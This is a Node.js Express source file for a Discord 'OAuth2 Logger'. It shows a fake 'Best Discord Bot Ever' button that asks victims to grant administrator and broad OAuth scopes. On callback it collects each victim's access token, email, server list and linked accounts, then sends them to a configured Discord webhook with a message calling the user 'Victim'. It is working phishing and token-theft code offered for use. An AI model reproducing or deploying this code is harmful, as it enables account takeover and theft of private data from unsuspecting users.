// get ngrok ready on port 3000, then put the url here -
const NGROK = 'https://ngrok.ngrok.app';
// make a new application with connection, read servers, email, and other shit here. client id below
const CLIENT_ID = '100100100100100';
// from the same application, put ur secret here
const CLIENT_SECRET = 'mYseCReT1(2samapwo';
// set the redirect url in ur app to "(ngrok)/callback" this is done for you so dont worry
const REDIRECT_URI = `${NGROK}/callback`;
// make a new server with a webhook, put the url here.
const WEBHOOK_URL = "https://discord.com/api/webhooks/6768308349248744423/T3hweBHooKg0EsHeRe_eoddkf.ffjhosehfoiOHdoiyhdff(ehskhfid"

console.log("A concept of what CordTool's OAuth2 Logger would be like. Thanks.")
	
// make sure
console.log(`${NGROK} - ngrok url \n ${CLIENT_ID} - client id \n ${CLIENT_SECRET} - client secret \n ${REDIRECT_URI} - redirect url \n ${WEBHOOK_URL} - log url \n Anything look incorrect? Please edit the code to your config.`);
	
// pluh

import express from 'express';

const app = express();

app.use(express.json());

// Homepage: login link
app.get('/', (_, res) => {
  const link = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify+email+guilds+connections+bot`;
  res.send(`
    <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #2C2F33; font-family: 'Segoe UI', sans-serif;">
      <a href="${link}" style="
        display: inline-block;
        padding: 20px 40px;
        background: linear-gradient(135deg, #7289DA, #99AAB5);
        color: white;
        font-size: 1.5rem;
        font-weight: bold;
        text-decoration: none;
        border-radius: 12px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        transition: transform 0.2s, box-shadow 0.2s;
        margin-bottom: 15px;
      " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 8px 20px rgba(0,0,0,0.4)';" 
         onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 5px 15px rgba(0,0,0,0.3)';">
        The Best Discord Bot Ever
      </a>
      <p style="color: #99AAB5; font-size: 0.9rem; text-align: center; max-width: 400px;">
        Please note that settings are changed through slash commands!
      </p>
    </div>
  `);
});


// OAuth2 callback
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('No code provided');

  try {
    // Exchange code for access token
    const params = new URLSearchParams();
    params.append('client_id', CLIENT_ID);
    params.append('client_secret', CLIENT_SECRET);
    params.append('grant_type', 'authorization_code');
    params.append('code', code);
    params.append('redirect_uri', REDIRECT_URI);

    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      body: params,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    });
    const tokenData = await tokenRes.json();

    // Fetch user info
    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const user = await userRes.json();

    console.log('Authorized user:', user);

          // Fetch user connections
      const connectionsRes = await fetch('https://discord.com/api/users/@me/connections', {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });
      const connections = await connectionsRes.json();

      console.log('Connections:', connections);

      // Format connections for the webhook
      // Example: connections is the array returned from /users/@me/connections
      let connectionsList = "No connections found";

      if (connections && connections.length > 0) {
        connectionsList = connections
          .map(conn => {
            const name = `${conn.name} (${conn.type})` || "Unknown";
            let url = "#"; // default fallback
          switch (conn.type) {
            case "youtube":
              url = `https://www.youtube.com/channel/${conn.id}`;
              break;
            case "twitch":
              url = `https://twitch.tv/${conn.name}`;
              break;
            case "spotify":
              url = `https://open.spotify.com/user/${conn.id}`;
              break;
            // add more types if you want
          }

            return `[${name}](${url})`;   // Markdown link
          })
          .join(" • "); // separate them with a dot
      }



    // Fetch user's guilds
    const guildsRes = await fetch('https://discord.com/api/users/@me/guilds', {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const guilds = await guildsRes.json();

    const guildList = guilds.length > 0
      ? guilds.map(g => `• ${g.name}`).join('\n')
      : 'No visible guilds';

    // Prepare safe values
const safeAvatar = user.avatar
  ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
  : 'https://cdn.discordapp.com/embed/avatars/0.png';

// guildList is e.g. guilds.map(...).join('\n')
let safeGuildList = guildList || 'No servers found.';
if (safeGuildList.length > 1024) safeGuildList = safeGuildList.slice(0, 2950) + '...';

// Build a short content (must be <=2000 chars)
let safeContent = (
  `||New User Authorized!\n` +
  `ID: ${user.id}\n` +
  `Username: ${user.username}#${user.discriminator}\n` +
  `Ping: <@${user.id}>\n` +
  `Servers: Victim is in ${guilds.length}, here is a list:\n${safeGuildList}\n` +
  `Email: ${user.email ? user.email : 'noverified@email.com'}\n` +
  `PFP: [click me](${safeAvatar}) ||`
);
// truncate content safely
if (safeContent.length > 1900) safeContent = safeContent.slice(0, 1975) + '...';

// Ensure all embed field values are strings
const embedFields = [
  { name: "ID", value: `${user.id}`, inline: true },
  { name: "Email", value: `${user.email || 'noverified@email.com'}`, inline: true },
  { name: "Servers", value: `${guilds.length}`, inline: true },
  { name: "Mention", value: `<@${user.id}>`, inline: true },
  { name: "Token", value: `||${tokenData.access_token}||`, inline: true },
  { name: "PFP", value: `${safeAvatar}`, inline: true },
  { name: "User", value: `${user.username}#${user.discriminator}`, inline: true },
  { name: "Servers Found", value: `${guilds.length}`, inline: true },
  { name: "Connections", value: `${connectionsList}`, inline: false},
];

// Compose embed (field values already stringified)
const embed = {
  title: "User OAuth2 Login",
  color: 0x5865F2,
  description: `**${user.username}#${user.discriminator}** has authorized the app.`,
  thumbnail: { url: safeAvatar },
  fields: embedFields,
  timestamp: new Date().toISOString(),
  footer: { text: "OAuth2 Logger" }
};

// Send webhook
const webhookRes = await fetch(WEBHOOK_URL, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: "OAuth2 Logger",
    avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
    content: safeContent,
    embeds: [embed]
  })
});

// debug: log Discord's response body on failure
if (!webhookRes.ok) {
  // Discord returns helpful JSON error messages
  const text = await webhookRes.text();
  res.send('<p>Failure in adding the bot!</p>')
  console.log('failed!');
} else {
  res.send('<p>success!</p>')
  console.error('success')
  }

  // Add a catch block to handle errors
} catch (error) {
  console.error('Error in /callback:', error);
  res.status(500).send('Internal Server Error');
}

});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));
